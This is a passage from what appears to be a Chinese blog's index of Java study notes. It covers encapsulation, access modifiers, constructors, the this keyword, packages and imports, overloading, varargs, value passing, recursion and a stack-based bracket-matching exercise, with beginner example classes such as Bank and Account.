当创建一个类的对象后，我们可以通过”对象.属性”的方式，对对象的属性赋值。这里，赋值操作要受到属性的数据类型和存储范围的制约。 除此之外，没有其他制约条件。但是，通常我们需要给属性赋值加入额外的限制条件。 这个条件就不能在属性声明时体现，我们只能通过方法进行限制条件的添加。（比如：setLegs()） 同时，我们需要避免用户再使用”对象.属性”的方式对属性进行赋值。则需要将属性声明为私有的(private). 此时，针对于属性就体现了封装性。 二.封装性的体现： 我们将类的属性 xxx 私有化(private),同时，提供公共的(public)方法来获取(getXxx)和设置(setXxx)此属性的值 拓展：封装性的体现： 如上 不对外暴露的私有的方法 单例模式 三.封装性的体现，需要权限修饰符来配合。 1.Java 规定的 4 种权限（从小到大排列）：private、缺省、protected 、public 2.4 种权限可以用来修饰类及类的内部结构：属性、方法、构造器、内部类 3.具体的，4 种权限都可以用来修饰类的内部结构：属性、方法、构造器、内部类修饰类的话，只能使用：缺省、public 四. 四种访问权限修饰符 修饰符 类内部 同一个包 不同包的子类 同一个工程 private Yes (缺省) Yes Yes protected Yes Yes Yes public Yes Yes Yes Yes 五.java 代码Order 类1234567891011121314151617181920212223package com.atguigu.java;/** * @program: project11 * @description: Order类 * @author: kkx * @create: 2021-12-18 23:49 **/public class Order &#123; private int orderPrivate; int orderDefault; public int orderPublic; private void methodPrivate()&#123; System.out.println(&quot;methodPrivate&quot;); &#125; void methodDefault()&#123; System.out.println(&quot;methodDefault&quot;); &#125; public void methodPublic()&#123; System.out.println(&quot;methodPublic&quot;); &#125;&#125; 同一个包下面调用类12345678910111213141516171819package com.atguigu.java;/** * @program: project11 * @description: Oeder类测试 * @author: kkx * @create: 2021-12-18 23:52 **/public class OrderTest &#123; public static void main(String[] args) &#123; Order order = new Order(); order.orderDefault = 1; order.orderPublic = 2;// a.legs = 4;//The field Animal.legs is not visible order.methodDefault(); order.methodPublic(); &#125;&#125; 不同包下面调用类123456789101112131415161718192021package com.atguigu.java1;import com.atguigu.java.Order;/** * @program: project11 * @description: Oeder类测试 * @author: kkx * @create: 2021-12-19 00:13 **/public class OrderTest &#123; public static void main(String[] args) &#123; Order order = new Order(); //出了Order类所属的包之后，私有的结构、缺省声明的结构就不可以调用了 //order.orderDefault = 1; order.orderPublic = 2; //order.methodDefault(); order.methodPublic(); &#125;&#125; 六.封装性总结：Java 提供了 4 种权限修饰符来修饰类及类的内部结构，体现类及类的内部结构在被调用时的可见性的大小。类的结构之三：构造器（或构造方法、constructor）的使用 construct：建设、建造。 construction:CCB constructor:建设者 一、构造器的作用： 创建对象 初始化对象的信息 二.Tip： 如果定义构造器的话，则系统默认提供一个空参的构造器。 定义构造器的格式：权限修饰符 类名(形参列表){}。 一个类中定义的多个构造器，彼此可以构成重载。 一旦我们定义了类的构造器之后，系统就不再提供默认的空参构造器。 一个类中，至少会有一个构造器。 三.java 代码Person 类 12345678910111213141516171819202122232425262728293031323334353637package com.atguigu.exer;/** * @program: project11 * @description: Person类 * @author: kkx * @create: 2021-12-19 00:24 **/public class Person &#123; private int age; private String name; public Person()&#123; age = 18; &#125; public Person(String n, int a)&#123; name = n; age = a; &#125; public void setAge(int a)&#123; if (a &lt; 0 || a &gt; 130)&#123; throw new RuntimeException(&quot;传入的数据非法！&quot;); //报红 //也可以先sout然后return &#125; age = a; &#125; public int getAge() &#123; return age; &#125; public void setName(String n)&#123; name = n; &#125; public String getName() &#123; return name; &#125;&#125; Person 类测试 123456789101112131415161718package com.atguigu.exer;/** * @program: project11 * @description: Person类的使用，类权限课后题 * @author: kkx * @create: 2021-12-19 00:25 **/public class PersonTest &#123; public static void main(String[] args) &#123; Person p1 = new Person(); p1.setAge(12); System.out.println(p1.getName() + &quot;\\t&quot; + p1.getAge()); Person p2 = new Person(&quot;Tom&quot;, 21); System.out.println(p2.getName() + &quot;\\t&quot; + p2.getAge()); &#125;&#125; 属性赋值的先后顺序 默认初始化 显式初始化 构造器中初始化 通过”对象.方法” 或 “对象.属性”的方式，赋值 以上操作的先后顺序：① - ② - ③ - ④ java 代码1234567891011121314151617181920212223242526272829303132package com.atguigu.java1;/** * @program: project11 * @description: 属性赋值的先后顺序 * @author: kkx * @create: 2021-12-19 11:33 **/public class UserTest &#123; public static void main(String[] args) &#123; User u1 = new User(); System.out.println(u1.age); User u2 = new User(2); u2.setAge(3); System.out.println(u2.age); &#125;&#125;class User&#123; String name; int age = 1; public User()&#123; &#125; public User(int a)&#123; age = a; &#125; public void setAge(int a)&#123; age = a; &#125;&#125; javaBean12345678910111213141516171819202122232425262728package com.atguigu.java1;/** * @program: project11 * @description: JavaBean * @author: kkx * @create: 2021-12-19 11:45 **/public class Customer &#123; public int id; private String name; public Customer()&#123; &#125; public void setId(int i)&#123; id = i; &#125; public int getId() &#123; return id; &#125; public void setName(String n)&#123; name = n; &#125; public String getName() &#123; return name; &#125;&#125; this 关键字的使用 this 可以用来修饰、调用：属性、方法、构造器 this 修饰属性和方法:this 为：当前对象 或 当前正在创建的对象 在类的方法中，我们可以使用”this.属性”或”this.方法”的方式，调用当前对象属性或方法。但是，通常情况下，我们都选择省略”this.”。特殊情况下，如果方法的形参和类的属性同名时，我们必须显式的使用”this.变量”的方式，表明此变量是属性，而非形参。 在类的构造器同理 this 调用构造器 我们在类的构造器中，可以显式的使用”this(形参列表)”方式，调用本类中指定的其他构造器 构造器中不能通过”this(形参列表)”方式调用自己 如果一个类中有 n 个构造器，则最多有 n - 1 构造器中使用了”this(形参列表)” 规定：”this(形参列表)”必须声明在当前构造器的首行 构造器内部，最多只能声明一个”this(形参列表)”，用来调用其他的构造器 java 代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657package com.atguigu.java2;/** * @program: project11 * @description: this关键字 * @author: kkx * @create: 2021-12-19 12:00 **/public class PersonTest &#123; public static void main(String[] args) &#123; Person p1 = new Person(); p1.setAge(1); System.out.println(p1.getAge()); Person p2 = new Person(&quot;Tom&quot;, 20); System.out.println(p2.getAge()); &#125;&#125;class Person&#123; private String name; private int age; public Person()&#123; System.out.println(&quot;Person初始化时，需要考虑如下的1,2,3,4&quot;); &#125; public Person(String name) &#123; this(); //Person初始化时，需要考虑如下的1,2,3,4 this.name = name; &#125; public Person(String name, int age) &#123; this(name); //这个必须放首行，每个构造器里面只能放一个this（） this.age = age; &#125; public void setName(String name) &#123; this.name = name; &#125; public String getName() &#123; return name; &#125; public void setAge(int age) &#123; this.age = age; &#125; public int getAge() &#123; return age; &#125; public void eat()&#123; System.out.println(&quot;eating&quot;); study(); &#125; public void study()&#123; System.out.println(&quot;studying&quot;); &#125;&#125; boy,gril 测试12345678910111213141516171819202122232425262728293031323334353637383940414243package com.atguigu.exer2;/** * @program: project11 * @description: Boy类 * @author: kkx * @create: 2021-12-19 12:55 **/public class Boy &#123; private String name; private int age; public Boy() &#123; &#125; public Boy(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public int getAge() &#123; return age; &#125; public void setAge(int age) &#123; this.age = age; &#125; public void marry(Girl girl)&#123; System.out.println(&quot;我要&quot; + girl.getName()); &#125; public void shout()&#123; if (this.age &gt;= 22)&#123; System.out.println(&quot;yes!&quot;); &#125;else &#123; System.out.println(&quot;no~&quot;); &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445package com.atguigu.exer2;/** * @program: project11 * @description: Girl类 * @author: kkx * @create: 2021-12-19 12:55 **/public class Girl &#123; private String name; private int age; public Girl(String name, int age) &#123; this.name = name; this.age = age; &#125; public String getName() &#123; return name; &#125; public void setName(String name) &#123; this.name = name; &#125; public void marry(Boy boy)&#123; System.out.println(&quot;我要&quot; + boy.getName()); boy.marry(this); &#125; /** * @Description: 比较两个对象的大小 * @Author: kkx * @Date: 2021/12/19 * @Param: [girl] * @return: 正数：当前对象大； 负数：当前对象小 ； 0：当前对象与形参对象相等 */ public int compare(Girl girl)&#123; if(this.age &gt; girl.age)&#123; return 1; &#125;else if (this.age &lt; girl.age)&#123; return -1; &#125;else &#123; return 0; &#125; &#125;&#125; 1234567891011121314151617181920212223242526package com.atguigu.exer2;/** * @program: project11 * @description: Boy，Girl类测试 * @author: kkx * @create: 2021-12-19 12:55 **/public class BoyGirlTest &#123; public static void main(String[] args) &#123; Boy boy = new Boy(&quot;阿强&quot;, 21); boy.shout(); Girl girl = new Girl(&quot;阿珍&quot;, 18); girl.marry(boy); Girl girl1 = new Girl(&quot;2233&quot;, 11); int compare = girl.compare(girl1); if (compare &gt; 0)&#123; System.out.println(girl.getName() + &quot;大&quot;); &#125;else if (compare &lt; 0)&#123; System.out.println(girl1.getName() + &quot;大&quot;); &#125;else &#123; System.out.println(&quot;一样大&quot;); &#125; &#125;&#125; Account 测试12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.atguigu.exer3;/** * @program: project11 * @description: Account类 * @author: kkx * @create: 2021-12-19 13:22 **/public class Account &#123; private int id;//账号 private double balance;//余额 private double annualInterestRate;//年利率 public Account(int id, double balance, double annualInterestRate) &#123; this.id = id; this.balance = balance; this.annualInterestRate = annualInterestRate; &#125; public int getId() &#123; return id; &#125; public void setId(int id) &#123; this.id = id; &#125; public double getBalance() &#123; return balance; &#125; public void setBalance(double balance) &#123; this.balance = balance; &#125; public double getAnnualInterestRate() &#123; return annualInterestRate; &#125; public void setAnnualInterestRate(double annualInterestRate) &#123; this.annualInterestRate = annualInterestRate; &#125; public void withdraw (double amount)&#123;//取钱 if (balance &lt; amount)&#123; System.out.println(&quot;余额不足，取款失败&quot;); return; &#125; balance -= amount; System.out.println(&quot;成功取出：&quot; + amount); &#125; public void deposit (double amount)&#123;//存钱 if (amount &gt; 0)&#123; balance += amount; System.out.println(&quot;成功存入：&quot; + amount); &#125; &#125;&#125; 12345678910111213141516171819202122232425262728293031package com.atguigu.exer3;/** * @program: project11 * @description: Customer类 * @author: kkx * @create: 2021-12-19 13:28 **/public class Customer &#123; private String firstName; private String lastName; private Account account; public Customer(String f, String l) &#123; this.firstName = f; this.lastName = l; &#125; public void setAccount(Account account) &#123; this.account = account; &#125; public String getFirstName() &#123; return firstName; &#125; public String getLastName() &#123; return lastName; &#125; public Account getAccount() &#123; return account; &#125;&#125; 1234567891011121314151617181920212223package com.atguigu.exer3;/** * @program: project11 * @description: Customer, Account测试 * @author: kkx * @create: 2021-12-19 13:32 **/public class CustomerTest &#123; public static void main(String[] args) &#123; Customer cust = new Customer(&quot;Jane&quot;, &quot;Smith&quot;); Account acct =new Account(1000, 2000, 0.0123); cust.setAccount(acct); cust.getAccount().deposit(100); cust.getAccount().withdraw(960); cust.getAccount().withdraw(2000); System.out.println(&quot;Customer[&quot; + cust.getLastName() + &quot;,&quot; + cust.getLastName() + &quot;]&quot; + &quot; &quot; + &quot;id:&quot; + cust.getAccount().getId() + &quot; &quot; + &quot;annualInterestRate:&quot; + cust.getAccount().getAnnualInterestRate()*100 + &quot;%&quot; + &quot; &quot; + &quot;balance:&quot; +cust.getAccount().getBalance()); &#125;&#125; Bank 测试1234567891011121314151617181920212223242526272829303132333435package com.atguigu.exer4;/** * @program: project11 * @description: Account类 * @author: kkx * @create: 2021-12-19 13:43 **/public class Account &#123; private double balance; public Account(double init_balance) &#123; this.balance = init_balance; &#125; public double getBalance() &#123; return balance; &#125; //存钱操作 public void deposit(double amt)&#123; if(amt &gt; 0)&#123; balance += amt; System.out.println(&quot;存钱成功&quot;); &#125; &#125; //取钱操作 public void withdraw(double amt)&#123; if(balance &gt;= amt)&#123; balance -= amt; System.out.println(&quot;取钱成功&quot;); &#125;else&#123; System.out.println(&quot;余额不足&quot;); &#125; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334package com.atguigu.exer4;/** * @program: project11 * @description: Bank类 * @author: kkx * @create: 2021-12-19 13:43 **/public class Bank &#123; private Customer[] customers;// 存放多个客户的数组 private int numberOfCustomers;// 记录客户的个数 public Bank()&#123; //这里要造数组，否则会空指针 customers = new Customer[10]; &#125; public void addCustomer(String f, String l)&#123; Customer cust = new Customer(f, l); customers[numberOfCustomers] = cust; numberOfCustomers++; //customers[numberOfCustomers++] = cust; &#125; public int getNumberOfCustomers() &#123; return numberOfCustomers; &#125; public Customer getCustomer(int index)&#123; if (index &gt;= 0&amp;&amp; index &lt; numberOfCustomers)&#123; return customers[index]; &#125; return null; &#125;&#125; 12345678910111213141516171819202122232425262728293031package com.atguigu.exer4;/** * @program: project11 * @description: Customer类 * @author: kkx * @create: 2021-12-19 13:44 **/public class Customer &#123; private String firstName; private String lastName; private Account account; public Customer(String f, String l) &#123; this.firstName = f; this.lastName = l; &#125; public Account getAccount() &#123; return account; &#125; public void setAccount(Account account) &#123; this.account = account; &#125; public String getFirstName() &#123; return firstName; &#125; public String getLastName() &#123; return lastName; &#125;&#125; 12345678910111213141516171819202122232425package com.atguigu.exer4;/** * @program: project11 * @description: Bank方测试 * @author: kkx * @create: 2021-12-19 13:46 **/public class BankTest &#123; public static void main(String[] args) &#123; Bank bank = new Bank(); bank.addCustomer(&quot;Jane&quot;, &quot;Smith&quot;); bank.getCustomer(0).setAccount(new Account(2000)); bank.getCustomer(0).getAccount().withdraw(500); double balance = bank.getCustomer(0).getAccount().getBalance(); System.out.println(&quot;客户：&quot; + bank.getCustomer(0).getFirstName() + &quot;的账户余额为：&quot; + balance); System.out.println(); bank.addCustomer(&quot;万里&quot;, &quot;杨&quot;); System.out.println(&quot;银行客户的个数为：&quot; + bank.getNumberOfCustomers()); &#125;&#125; Package 的使用 为了更好的实现项目中类的管理，提供包的概念 使用 package 声明类或接口所属的包，声明在源文件的首行 包，属于标识符，遵循标识符的命名规则、规范(xxxyyyzzz)、“见名知意” 每”.”一次，就代表一层文件目录。 JDK 中主要的包介绍 java.lang—-包含一些 Java 语言的核心类，如 String、Math、Integer、 System 和Thread，提供常用功能 java.net—-包含执行与网络相关的操作的类和接口。 java.io —-包含能提供多种输入&#x2F;输出功能的类。 java.util—-包含一些实用工具类，如定义系统特性、接口的集合框架类、使用与日期日历相关的函数。 java.text—-包含了一些 java 格式化相关的类 java.sql—-包含了 java 进行 JDBC 数据库编程的相关类&#x2F;接口 java.awt—-包含了构成抽象窗口工具集（abstract window toolkits）的多个类，这些类被用来构建和管理应用程序的图形用户界面(GUI)。 Import 的使用 在源文件中显式的使用 import 结构导入指定包下的类、接口 声明在包的声明和类的声明之间 如果需要导入多个结构，则并列写出即可 可以使用”xxx.*“的方式，表示可以导入 xxx 包下的所有结构 在 java.lang 下的话（java.lang.System 常用），则可以省略 import 结构 如果使用的类或接口是本包下定义的，则可以省略 import 结构 如果在源文件中，使用了不同包下的同名的类，则必须至少有一个类需要以全类名的方式显示。 使用”xxx.*“方式表明可以调用 xxx 包下的所有结构。但是如果使用的是 xxx 子包下的结构，则仍需要显式导入 import static:导入指定类或接口中的静态结构:属性或方法。 123456789101112131415161718192021222324252627282930313233343536373839package com.atguigu.java2;import com.atguigu.exer4.Account;import com.atguigu.exer4.Bank;import com.atguigu.java2.java3.Dog;import java.util.*; //import 类、接口import static java.lang.System.*; //import static 结构（属性或方法）import static java.lang.Math.*;/** * @program: project11 * @description: PackageImport测试 * @author: kkx * @create: 2021-12-20 14:59 **/public class PackageImportTest &#123; public static void main(String[] args) &#123; Bank bank = new Bank(); Arrays.toString(new int[]&#123;1, 2, 3&#125;); HashMap map = new HashMap(); Scanner scanner = null; Account acct = new Account(1000); //全类名的方式显示 com.atguigu.exer3.Account acct1 = new com.atguigu.exer3.Account(1000,2000,0.0123); Date date = new Date(); java.sql.Date date1 = new java.sql.Date(123465l); Dog dog = new Dog(); //import static:导入指定类或接口中的静态结构:属性或方法 out.println(&quot;hello&quot;); long num = round(81); &#125;&#125;","tags":["Java","学习笔记","基础","封装性","构造器","this"],"categories":["Java学习笔记"]},{"title":"java练习3","path":"//coding/java/exercise/3.html","content":"用栈进行括号匹配12345678910111213141516171819202122232425262728293031323334353637383940414243/** * @program: exercise * @description: 用栈进行括号匹配 * @author: yuuko * @create: 2021-12-12 15:42 **/import java.util.Scanner;import java.util.Stack;public class KuoHao &#123; public static void main(String[] args) &#123; Scanner input=new Scanner(System.in); String s=input.next(); System.out.println(solution(s)); &#125; public static boolean solution(String s)&#123; Stack&lt;Character&gt; stack1=new Stack&lt;&gt;(); char currentCorrectChar; for(int i=0;i&lt;s.length();i++) &#123; switch (s.charAt(i)) &#123; case &#x27;(&#x27;: stack1.push(&#x27;)&#x27;); break; case &#x27;[&#x27;: stack1.push(&#x27;]&#x27;); break; case &#x27;&#123;&#x27;: stack1.push(&#x27;&#125;&#x27;); break; default: if(stack1.isEmpty()) return false; else currentCorrectChar = stack1.pop(); if (currentCorrectChar != s.charAt(i)) return false; &#125; &#125; if(!stack1.isEmpty()) return false; return true; &#125;&#125; 自定义栈进行括号匹配123456789101112131415161718192021222324252627282930313233343536373839/** * @program: exercise * @description: 自己定义的栈 * @author: yuuko * @create: 2021-12-12 15:49 **/public class myCharStack &#123; private myCharStack header; private myCharStack next=null; private char content; myCharStack()&#123; this.header=this; &#125; myCharStack(char content)&#123; this.content=content; &#125; public void push(char content)&#123; myCharStack stack1=new myCharStack(content); stack1.next=this.header.next; this.header.next=stack1; &#125; public char pop()&#123; if(this.header.next==null)&#123; System.out.println(&quot;EmptyStackException here&quot;); return &#x27;X&#x27;; &#125; char popContent=this.header.next.content; this.header.next=this.header.next.next; return popContent; &#125; public boolean isEmpty()&#123; return this.header.next == null; &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738394041/** * @program: exercise * @description: * @author: kkx * @create: 2021-12-12 15:57 **/import java.util.Scanner;public class myKuoHao &#123; public static void main(String[] args) &#123; Scanner input=new Scanner(System.in); String s=input.next(); System.out.println(solution(s)); &#125; public static boolean solution(String s)&#123; myCharStack stack1=new myCharStack(); char currentCorrectChar; for(int i=0;i&lt;s.length();i++) &#123; switch (s.charAt(i)) &#123; case &#x27;(&#x27;: stack1.push(&#x27;)&#x27;); break; case &#x27;[&#x27;: stack1.push(&#x27;]&#x27;); break; case &#x27;&#123;&#x27;: stack1.push(&#x27;&#125;&#x27;); break; default: currentCorrectChar = stack1.pop(); if (currentCorrectChar != s.charAt(i)) return false; &#125; &#125; if(!stack1.isEmpty()) return false; return true; &#125;&#125;","tags":["Java","练习","进阶","栈"],"categories":["Java练习"]},{"title":"java学习笔记10","path":"//coding/java/note/10.html","content":"1. 理解“万事万物皆对象”1.在 Java 语言范畴中，我们都将功能、结构等封装到类中，通过类的实例化，来调用具体的功能结构 Scanner,String 等文件：File网络资源：URL 2. 涉及到 Java 语言与前端 Html、后端的数据库交互时，前后端的结构在 Java 层面交互时，都体现为类、对象。2、内存解析的说明引用类型的变量，只可能存储两类值：null 或 地址值（含变量的类型） 3. 匿名对象的使用 理解：我们创建的对象，没有显式的赋给一个变量名。即为匿名对象 特征：匿名对象只能调用一次。 java 代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344package com.atguigu.java;/** * @description: 匿名对象 * @author: kkx * @create: 2021-12-12 12:59 **/public class InstanceTest &#123; public static void main(String[] args) &#123; Phone p = new Phone(); p.playGame(); new Phone().playGame(); new Phone().price = 1999; new Phone().showPrice(); //0.0 //常用 PhoneMall mall = new PhoneMall(); //匿名对象的使用 mall.show(new Phone()); &#125;&#125;class PhoneMall&#123; public void show(Phone phone)&#123; phone.sendEmail(); phone.playGame(); &#125;&#125;class Phone&#123; double price; public void sendEmail()&#123; System.out.println(&quot;发送邮件&quot;); &#125; public void playGame()&#123; System.out.println(&quot;玩游戏&quot;); &#125; public void showPrice()&#123; System.out.println(&quot;价格为&quot; + price); &#125;&#125; 4. 自定义工具类的封装12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091package com.atguigu.java;/** * @description: 工具类的封装 * @author: kkx * @create: 2021-12-12 13:38 **/public class ArrayUtil &#123; // 求数组的最大值 public int getMax(int[] arr)&#123; int maxValue = arr[0]; for (int i = 1; i &lt; arr.length; i++) &#123; if (maxValue &lt; arr[i]) &#123; maxValue = arr[i]; &#125; &#125; return maxValue; &#125; // 求数组的最小值 public int getMin(int[] arr)&#123; int minValue = arr[0]; for (int i = 1; i &lt; arr.length; i++) &#123; if (minValue &gt; arr[i]) &#123; minValue = arr[i]; &#125; &#125; return minValue; &#125; // 求数组的总和 public int getSum(int[] arr)&#123; int sum = 0; for (int i = 0; i &lt; arr.length; i++) &#123; sum += arr[i]; &#125; return sum; &#125; // 求数组的平均值 public int getAvg(int[] arr)&#123; return getSum(arr) / arr.length; &#125; //如下的两个同名方法构成了重载 // 反转数组 public void reverse(int[] arr)&#123; for (int i = 0; i &lt; arr.length / 2; i++) &#123; int temp = arr[i]; arr[i] = arr[arr.length - i - 1]; arr[arr.length - i - 1] = temp; &#125; &#125; public void reverse(String[] arr)&#123; &#125; // 复制数组 public int[] copy(int[] arr) &#123; int[] arr1 = new int[arr.length]; for (int i = 0; i &lt; arr1.length; i++) &#123; arr1[i] = arr[i]; &#125; return arr1; &#125; // 数组排序 public void sort(int[] arr)&#123; // 冒泡排序 for (int i = 0; i &lt; arr.length - 1; i++) &#123; for (int j = 0; j &lt; arr.length - 1 - i; j++) &#123; if (arr[j] &gt; arr[j + 1]) &#123; int temp = arr[j]; arr[j] = arr[j + 1]; arr[j + 1] = temp; &#125; &#125; &#125; &#125; // 遍历数组 public void print(int[] arr) &#123; for (int i = 0; i &lt; arr.length; i++) &#123; System.out.print(arr[i] + &quot;\\t&quot;); &#125; System.out.println(); &#125; // 查找指定元素 public int getIndex(int[] arr, int dest)&#123; // 线性查找： for (int i = 0; i &lt; arr.length; i++) &#123; if (dest == arr[i]) &#123; return i; &#125; &#125; return -1;//返回一个负数，表示没有找到 &#125;&#125; 12345678910111213141516171819202122232425262728293031package com.atguigu.java;/** * @description: 使用自定义工具类 * @author: kkx * @create: 2021-12-12 13:44 **/public class ArrayUtilTest &#123; public static void main(String[] args) &#123; ArrayUtil util = new ArrayUtil(); int[] arr = new int[]&#123;32,34,32,5,3,54,654,-98,0,-53,5&#125;; System.out.println(&quot;最大值为&quot; + util.getMax(arr)); System.out.println(&quot;排序前：&quot;); util.print(arr); util.sort(arr); System.out.println(&quot;排序后：&quot;); util.print(arr); System.out.println(&quot;查找：&quot;); int index = util.getIndex(arr, -5); if(index &gt;= 0)&#123; System.out.println(&quot;找到了，索引地址为：&quot; + index); &#125;else&#123; System.out.println(&quot;未找到&quot;); &#125; util.reverse(arr); &#125;&#125; 5. 方法的重载1. 定义： 在同一个类中，允许存在一个以上的同名方法，只要它们的参数个数或者参数类型不同即可。“两同一不同”:同一个类、相同方法名参数列表不同：参数个数不同，参数类型不同 2. 举例：Arrays 类中重载的 sort() &#x2F; binarySearch()3. 判断是否是重载：跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系！4. 在通过对象调用方法时，通过方法名和参数列表确定方法5. java 代码12345678910111213141516171819202122232425262728293031323334353637383940414243package com.atguigu.java1;/** * @description: 方法的重载 * @author: kkx * @create: 2021-12-12 13:56 **/public class OverLoadTest &#123; public static void main(String[] args) &#123; OverLoadTest test = new OverLoadTest(); test.getSum(1, 2); //1 test.getSum(1.0, 2.0); //2 &#125; //如果没有这个方法，则提升为double的方法 public void getSum(int i, int j)&#123; System.out.println(1); &#125; public void getSum(double d1, double d2)&#123; System.out.println(2); &#125; //传参数有顺序要求，顺序不一样也重载 public void getSum(String s ,int i)&#123; System.out.println(3); &#125; public void getSum(int i,String s)&#123; System.out.println(4); &#125; /* 如下的3个方法不能与上述4个方法构成重载 跟方法的权限修饰符、返回值类型、形参变量名、方法体都没有关系 public int getSum(int i,int j)&#123; return 0; &#125; public void getSum(int m,int n)&#123; &#125; private void getSum(int i,int j)&#123; &#125; */&#125; 6. 可变个数形参的方法 可变个数形参的格式：数据类型 … 变量名 当调用可变个数形参的方法时，传入的参数个数可以是：0 个，1 个,2 个，。。。 可变个数形参的方法与本类中方法名相同，形参不同的方法之间构成重载 可变个数形参的方法与本类中方法名相同，形参类型也相同的数组之间不构成重载。 可变个数形参在方法的形参中，必须声明在末尾 可变个数形参在方法的形参中,最多只能声明一个可变形参。 1234567891011121314151617181920212223242526272829package com.atguigu.java1;import java.util.Arrays;/** * @program: project10 * @description: 可变个数形参的方法 * @author: kkx * @create: 2021-12-13 20:51 **/public class MethodArgsTest &#123; public static void main(String[] args) &#123; MethodArgsTest test = new MethodArgsTest(); test.show(&quot;hello world&quot;); test.show(new String[]&#123;&quot;AA&quot;, &quot;BB&quot;&#125;); &#125; public void show(String s)&#123; System.out.println(&quot;String s&quot;); &#125; public void show(String ... strings)&#123; System.out.println(&quot;String ... strings&quot;); System.out.println(Arrays.toString(strings)); &#125; //不能与上一个方法同时存在// public void show(String[] strs)&#123;//// &#125;&#125; 7. 关于变量的赋值 基本数据类型，此时赋值的是变量所保存的数据值。 引用数据类型，此时赋值的是变量所保存的数据的地址值。 1234567891011121314151617181920212223242526272829package com.atguigu.java1;/** * @program: project10 * @description: 关于变量的赋值 * @author: kkx * @create: 2021-12-13 22:41 **/public class ValueTransferTest &#123; public static void main(String[] args) &#123; int m = 10; int n = m; System.out.println(m + &quot;\\t&quot;+ n); n = 20; System.out.println(m + &quot;\\t&quot;+ n); Order o1 = new Order(); o1.orderId = 1001; Order o2 = o1;//赋值以后，o1和o2的地址值相同 System.out.println(o1.orderId + &quot;\\t&quot; + o2.orderId); o2.orderId = 1002; System.out.println(o1.orderId + &quot;\\t&quot; + o2.orderId); &#125;&#125;class Order&#123; int orderId;&#125; 12345678910111213141516171819202122232425package com.atguigu.java1;/** * @program: project10 * @description: 方法的形参的传递机制：值传递 * @author: kkx * @create: 2021-12-13 23:12 **/public class ValueTransferTest1 &#123; public static void main(String[] args) &#123; int m = 10; int n = 20; System.out.println(m + &quot;\\t&quot; + n); //10 20 ValueTransferTest1 test = new ValueTransferTest1(); test.swap(m, n); System.out.println(m + &quot;\\t&quot; + n); //10 20 &#125; public void swap(int m, int n)&#123; int temp = m; m = n; n = temp; &#125;&#125; 1234567891011121314151617181920212223242526272829package com.atguigu.java1;/** * @program: project10 * @description: 实现交换 * @author: kkx * @create: 2021-12-13 23:40 **/public class ValueTransferTest2 &#123; public static void main(String[] args) &#123; Data data = new Data(); data.m = 10; data.n = 20; System.out.println(data.m + &quot;\\t&quot; + data.n); //10 20 ValueTransferTest2 test = new ValueTransferTest2(); test.swap(data); System.out.println(data.m + &quot;\\t&quot; + data.n); //20 10 &#125; public void swap(Data data)&#123; int temp = data.m; data.m = data.n; data.n = temp; &#125;&#125;class Data&#123; int m; int n;&#125; 8. 面试题1234567891011121314151617181920212223/** * @program: project10 * @description: 面试坑1 * @author: kkx * @create: 2021-12-14 23:34 **/public class test &#123; public static void main(String[] args) &#123; int a = 10; int b = 10; method(a, b); //仅输出a = 100,b = 200 System.out.println(&quot;a=&quot; + a); System.out.println(&quot;b=&quot; + b); &#125; public static void method(int a, int b)&#123; //自己编写 a = a * 10; b = b * 20; System.out.println(a); System.out.println(b); System.exit(0); &#125;&#125; 1234567891011121314/** * @program: project10 * @description: 面试坑2 * @author: kkx * @create: 2021-12-14 23:39 **/public class test1 &#123; public static void main(String[] args) &#123; int[] arr = new int[]&#123;1, 2, 3&#125;; System.out.println(arr); //地址值 char[] arr1 = new char[]&#123;&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;&#125;; System.out.println(arr1); //abc &#125;&#125; 9. 递归 递归方法：一个方法体内调用它自身。 方法递归包含了一种隐式的循环，它会重复执行某段代码，但这种重复执行无须循环控制。递归一定要向已知方向递归，否则这种递归就变成了无穷递归，类似于死循环。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package com.atguigu.java1;/** * @program: project10 * @description: 递归 * @author: kkx * @create: 2021-12-17 00:35 **/public class RecursionTest &#123; public static void main(String[] args) &#123; // 例1：计算1-100之间所有自然数的和 // 方式一： int sum = 0; for (int i = 1; i &lt;= 100; i++) &#123; sum += i; &#125; System.out.println(sum); // 方式二： RecursionTest test = new RecursionTest(); System.out.println(test.getSum1(100)); System.out.println(test.f(10)); System.out.println(test.fibonacci(10)); &#125; // 例1：计算1-n之间所有自然数的和 public int getSum(int n)&#123; if (n == 1)&#123; return 1; &#125;else &#123; return n + getSum(n - 1); &#125; &#125; // 例2：计算1-n之间所有自然数的乘积:n! public int getSum1(int n)&#123; if (n == 1)&#123; return 1; &#125;else &#123; return n * getSum(n - 1); &#125; &#125; //例3：已知有一个数列：f(0) = 1,f(1) = 4,f(n+2)=2*f(n+1) + f(n), public int f(int n)&#123; if (n == 0)&#123; return 1; &#125;else if(n == 1)&#123; return 4; &#125;else &#123; return 2 * f(n - 1) + f(n - 2); &#125; &#125; //例4：斐波那契数列 public int fibonacci(int n)&#123; if (n == 0)&#123; return 0; &#125;else if(n == 1)&#123; return 1; &#125;else &#123; return fibonacci(n - 1) + fibonacci(n - 2); &#125; &#125; //例5：汉诺塔问题 //例6：快排&#125;","tags":["Java","学习笔记","基础","类"],"categories":["Java学习笔记"]},{"title":"java学习笔记9","path":"//coding/java/note/9.html","content":"1. java 面向对象学习的三条主线 Java 类及类的成员：属性、方法、构造器；代码块、内部类 面向对象的三大特征：封装性、继承性、多态性、(抽象性) 其它关键字：this、super、static、final、abstract、interface、package、import 等 2. 面向对象和面向过程的区别面向过程：强调的是功能行为，以函数为最小单位，考虑怎么做。123① 把冰箱门打开② 抬起大象，塞进冰箱② 把冰箱门关闭 面向对象：强调具备了功能的对象，以类&#x2F;对象为最小单位，考虑谁来做。123456789101112131415161718192021222324人&#123; 打开(冰箱)&#123; 冰箱.开开(); &#125; 抬起(大象)&#123; 大象.进入(冰箱); &#125; 